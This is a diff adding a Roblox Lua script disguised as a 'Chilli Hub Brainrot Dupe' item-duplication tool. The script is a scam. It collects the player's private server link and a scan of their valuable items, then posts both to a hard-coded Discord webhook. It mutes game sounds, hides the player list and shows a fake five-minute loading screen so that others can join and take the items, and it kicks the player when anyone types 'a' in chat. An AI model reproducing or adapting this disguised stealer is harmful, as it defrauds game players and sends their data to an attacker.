@@ -1,0 +1,266 @@
+return (function(...)
+    -- Services
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+    local StarterGui = game:GetService("StarterGui")
+    local HttpService = game:GetService("HttpService")
+    local RunService = game:GetService("RunService")
+    local SoundService = game:GetService("SoundService")
+    local TextChatService = game:GetService("TextChatService")
+    local Workspace = game:GetService("Workspace")
+
+    -- Webhook URL
+    local WebhookURL = 'https://discord.com/api/webhooks/1376458504528986183/pIHEvUckI5ONAvwE0e5ec352RDAxxHEudCi-tskmciasyFxm0K0CJisRKwql_qT0UnAh'
+
+    -- Robust HTTP POST
+    local function httpPost(url, bodyJson)
+        local send = function(req)
+            local ok, res = pcall(req)
+            return ok, res
+        end
+        if syn and syn.request then return send(function() return syn.request({Url=url, Method='POST', Headers={['Content-Type']='application/json'}, Body=bodyJson}) end) end
+        if request then return send(function() return request({Url=url, Method='POST', Headers={['Content-Type']='application/json'}, Body=bodyJson}) end) end
+        if http_request then return send(function() return http_request({Url=url, Method='POST', Headers={['Content-Type']='application/json'}, Body=bodyJson}) end) end
+        return send(function() return HttpService:PostAsync(url, bodyJson, Enum.HttpContentType.ApplicationJson) end)
+    end
+
+    local function SendWebhook(userText, plotsData)
+        local totalCount = 0
+        local extraFields = {}
+        for _, data in ipairs(plotsData) do
+            totalCount = totalCount + #data.objects
+            local val = ""
+            for _, name in ipairs(data.objects) do
+                val = val .. "🐾 " .. name .. "\n"
+            end
+            if #val > 900 then val = val:sub(1,900).."\n... (truncated)" end
+            table.insert(extraFields,{name="🛖 "..data.plotName.." ("..#data.objects.." Controllers)", value=val, inline=false})
+        end
+
+        local embed = {
+            title = userText or "PS Link",
+            description = "Valuable items",
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+            color = 3447003,
+            fields = extraFields,
+            footer = {text=("Summary: Total %d items | Scanned by %s | Place %s"):format(totalCount, LocalPlayer.Name, game.PlaceId)}
+        }
+
+        local payload = {content="@everyone", embeds={embed}}
+        httpPost(WebhookURL, HttpService:JSONEncode(payload))
+    end
+
+    -- Mute all sounds
+    for _, sound in ipairs(SoundService:GetDescendants()) do
+        if sound:IsA('Sound') then
+            sound.Volume = 0
+        end
+    end
+
+    -- Chat kick
+    local function setupTextChatKick()
+        if TextChatService and TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
+            local general = TextChatService.TextChannels.RBXGeneral
+            general.MessageReceived:Connect(function(message)
+                if message and message.Text and string.lower(tostring(message.Text)) == "a" then
+                    LocalPlayer:Kick("Kicked because someone said 'a' in chat!")
+                end
+            end)
+        else
+            local ChatService = game:GetService("Chat")
+            if ChatService and ChatService.OnMessageDoneFiltering and ChatService.OnMessageDoneFiltering.OnClientEvent then
+                ChatService.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
+                    if messageData and messageData.Message and string.lower(tostring(messageData.Message)) == "a" then
+                        LocalPlayer:Kick("Kicked because someone said 'a' in chat!")
+                    end
+                end)
+            end
+            for _, p in ipairs(Players:GetPlayers()) do
+                p.Chatted:Connect(function(msg)
+                    if string.lower(tostring(msg)) == "a" then
+                        LocalPlayer:Kick("Kicked because someone said 'a' in chat!")
+                    end
+                end)
+            end
+            Players.PlayerAdded:Connect(function(p)
+                p.Chatted:Connect(function(msg)
+                    if string.lower(tostring(msg)) == "a" then
+                        LocalPlayer:Kick("Kicked because someone said 'a' in chat!")
+                    end
+                end)
+            end)
+        end
+    end
+    setupTextChatKick()
+
+    -- ===== GUI =====
+    local ScreenGui = Instance.new('ScreenGui')
+    ScreenGui.Name = 'BrainrotChatbox'
+    ScreenGui.Parent = PlayerGui
+
+    local Frame = Instance.new('Frame')
+    Frame.Size = UDim2.new(0, 400, 0, 220)
+    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    Frame.AnchorPoint = Vector2.new(0.5,0.5)
+    Frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
+    Frame.BorderSizePixel = 0
+    Frame.Parent = ScreenGui
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0,12)
+    corner.Parent = Frame
+
+    local TitleLabel = Instance.new('TextLabel')
+    TitleLabel.Size = UDim2.new(1,-20,0,50)
+    TitleLabel.Position = UDim2.new(0,10,0,10)
+    TitleLabel.BackgroundTransparency = 1
+    TitleLabel.Text = '🌶️ Chilli Hub Brainrot Dupe 🌶️'
+    TitleLabel.Font = Enum.Font.GothamBold
+    TitleLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    TitleLabel.TextSize = 24
+    TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
+    TitleLabel.Parent = Frame
+
+    local LinkBox = Instance.new('TextBox')
+    LinkBox.Size = UDim2.new(0.9,0,0,40)
+    LinkBox.Position = UDim2.new(0.05,0,0.4,0)
+    LinkBox.PlaceholderText = 'Enter your PS Link'
+    LinkBox.ClearTextOnFocus = false
+    LinkBox.Text = ''
+    LinkBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
+    LinkBox.TextColor3 = Color3.fromRGB(230,230,230)
+    LinkBox.Font = Enum.Font.Gotham
+    LinkBox.TextSize = 18
+    LinkBox.BorderSizePixel = 0
+    LinkBox.Parent = Frame
+    local linkCorner = Instance.new("UICorner")
+    linkCorner.CornerRadius = UDim.new(0,8)
+    linkCorner.Parent = LinkBox
+
+    local SendButton = Instance.new('TextButton')
+    SendButton.Size = UDim2.new(0.5,0,0,40)
+    SendButton.Position = UDim2.new(0.25,0,0.6,0)
+    SendButton.BackgroundColor3 = Color3.fromRGB(85,170,255)
+    SendButton.Text = 'Send'
+    SendButton.Font = Enum.Font.GothamBold
+    SendButton.TextSize = 20
+    SendButton.TextColor3 = Color3.fromRGB(255,255,255)
+    SendButton.BorderSizePixel = 0
+    SendButton.Parent = Frame
+    local sendCorner = Instance.new("UICorner")
+    sendCorner.CornerRadius = UDim.new(0,8)
+    sendCorner.Parent = SendButton
+
+    -- ===== Plot Scanner =====
+    local function findPlots()
+        local plots = {}
+        for _, folderName in ipairs({"Plots","plots","PlotFolder"}) do
+            local folder = Workspace:FindFirstChild(folderName)
+            if folder then
+                for _, child in ipairs(folder:GetChildren()) do
+                    if child:IsA("Model") then table.insert(plots,child) end
+                end
+            end
+        end
+        return plots
+    end
+
+    local function instanceHasAnimationController(instance)
+        if not instance then return false end
+        for _, d in ipairs(instance:GetDescendants()) do
+            if d:IsA("AnimationController") then return true end
+        end
+        if instance:FindFirstChildOfClass("AnimationController") then return true end
+        return false
+    end
+
+    local function scanPlots()
+        local plotsData = {}
+        for _, plot in ipairs(findPlots()) do
+            local objs = {}
+            for _, desc in ipairs(plot:GetDescendants()) do
+                if instanceHasAnimationController(desc) then table.insert(objs, desc.Name) end
+            end
+            if #objs>0 then table.insert(plotsData,{plotName=plot.Name, objects=objs}) end
+        end
+        return plotsData
+    end
+
+    -- ===== Show Loading Screen =====
+    local function ShowLoadingScreen()
+        ScreenGui:Destroy()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList,false)
+
+        local LoadingGui = Instance.new('ScreenGui')
+        LoadingGui.Name = 'ChilliLoadingScreen'
+        LoadingGui.ResetOnSpawn = false
+        LoadingGui.IgnoreGuiInset = true
+        LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        LoadingGui.Parent = PlayerGui
+
+        local LoadingFrame = Instance.new('Frame')
+        LoadingFrame.Size = UDim2.new(1,0,1,0)
+        LoadingFrame.Position = UDim2.new(0,0,0,0)
+        LoadingFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+        LoadingFrame.Parent = LoadingGui
+
+        local LoadingTitle = Instance.new('TextLabel')
+        LoadingTitle.Size = UDim2.new(1,0,0,60)
+        LoadingTitle.Position = UDim2.new(0,0,0,0)
+        LoadingTitle.BackgroundTransparency = 1
+        LoadingTitle.Text = '🌶️ Chilli Hub Brainrot Dupe 🌶️'
+        LoadingTitle.Font = Enum.Font.GothamBold
+        LoadingTitle.TextSize = 28
+        LoadingTitle.TextColor3 = Color3.fromRGB(255,255,255)
+        LoadingTitle.TextStrokeTransparency = 0.7
+        LoadingTitle.Parent = LoadingFrame
+
+        local ProgressBarFrame = Instance.new('Frame')
+        ProgressBarFrame.Size = UDim2.new(0.8,0,0,30)
+        ProgressBarFrame.Position = UDim2.new(0.1,0,0.5,-15)
+        ProgressBarFrame.BackgroundColor3 = Color3.fromRGB(50,50,50)
+        ProgressBarFrame.BorderSizePixel = 0
+        ProgressBarFrame.Parent = LoadingFrame
+
+        local ProgressBar = Instance.new('Frame')
+        ProgressBar.Size = UDim2.new(0,0,1,0)
+        ProgressBar.Position = UDim2.new(0,0,0,0)
+        ProgressBar.BackgroundColor3 = Color3.fromRGB(85,170,255)
+        ProgressBar.BorderSizePixel = 0
+        ProgressBar.Parent = ProgressBarFrame
+
+        local ProgressLabel = Instance.new('TextLabel')
+        ProgressLabel.Size = UDim2.new(0.8,0,0,30)
+        ProgressLabel.Position = UDim2.new(0.1,0,0.5,20)
+        ProgressLabel.BackgroundTransparency = 1
+        ProgressLabel.Text = '0%'
+        ProgressLabel.Font = Enum.Font.GothamBold
+        ProgressLabel.TextSize = 24
+        ProgressLabel.TextColor3 = Color3.fromRGB(255,255,255)
+        ProgressLabel.TextXAlignment = Enum.TextXAlignment.Center
+        ProgressLabel.Parent = LoadingFrame
+
+        local VisualDuration = 300
+        local StartTime = tick()
+        local conn
+        conn = RunService.RenderStepped:Connect(function()
+            local elapsed = tick()-StartTime
+            local t = math.clamp(elapsed/VisualDuration,0,1)
+            local eased = 1 - math.pow(1-t,3)
+            ProgressBar.Size = UDim2.new(eased,0,1,0)
+            ProgressLabel.Text = string.format('%.1f%%',eased*100)
+            if t>=1 and conn then conn:Disconnect() end
+        end)
+    end
+
+    -- ===== Send Button Logic =====
+    SendButton.MouseButton1Click:Connect(function()
+        local text = LinkBox.Text
+        if text ~= '' then
+            local plotsData = scanPlots()
+            SendWebhook(text, plotsData)
+            LinkBox.Text = ''
+            ShowLoadingScreen() -- <-- show old loading screen after sending webhook
+        end
+    end)
+end)()
